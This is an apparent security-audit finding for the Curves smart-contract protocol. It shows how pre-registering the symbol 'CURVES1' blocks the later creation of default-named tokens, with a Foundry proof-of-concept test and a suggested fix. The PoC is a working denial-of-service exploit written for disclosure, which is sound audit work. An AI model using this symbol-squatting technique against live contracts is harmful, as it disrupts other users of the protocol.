## L-01 - Any user can halt creating generic Curve tokens

Because of how Curves._deployERC20() is designed, if a token's symbol equals DEFAULT_SYMBOL, the protocol will auto-generate a token name and symbol. You can see that here:

```solidity
// Inside Curves._deployERC20()
//
if (keccak256(bytes(symbol)) == keccak256(bytes(DEFAULT_SYMBOL))) {
    _curvesTokenCounter += 1;
    name = string(abi.encodePacked(name, " ", Strings.toString(_curvesTokenCounter)));
    symbol = string(abi.encodePacked(symbol, Strings.toString(_curvesTokenCounter)));
}

if (symbolToSubject[symbol] != address(0)) revert InvalidERC20Metadata();
...
symbolToSubject[symbol] = curvesTokenSubject;
```

If another curveTokenSubject set their token as a future name and symbol:

name: `Curves 1`
symbol: `CURVES1`

This will set `CURVES1 ` as a key in Curves.symbolToSubject and prevent any future curve token subject from creating a default curve token and symbol since the key is already taken.

You can run the test below which will lead to a revert since another user :

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../contracts/Curves.sol";

contract CurveTest is Test {
  FeeSplitter public feeRedistributor;
  CurvesERC20Factory public curvesERC20Factory;
  Curves public curves;

  address curveTokenSubject = address(0x88);
  address innocent = address(0x01);
  address hacker = address(0x07);

  function setUp() public {
    address feeRedistributor_ = address(0x88);

    curvesERC20Factory = new CurvesERC20Factory();
    feeRedistributor = FeeSplitter(payable(feeRedistributor_));

    curves = new Curves(address(curvesERC20Factory), address(feeRedistributor));

    // AUDIT: Creating token with placeholder values will break creating Curve tokens with default name/symbol
    vm.startPrank(curveTokenSubject);
    curves.buyCurvesTokenWithName(
      curveTokenSubject,
      1,
      "Curves 1",
      "CURVES1"
    );
  }

  function testCurveDefaultValueBroken() public {
    vm.startPrank(innocent);
    vm.deal(innocent, 21146875000000000000);
    curves.buyCurvesTokenWithName(
      curveTokenSubject,
      1,
      "Curves",
      "CURVES"
    );
  }
}  
```
 
Curves should consider an alternate approach to generating a token name and symbol such that it can't be DOS'd.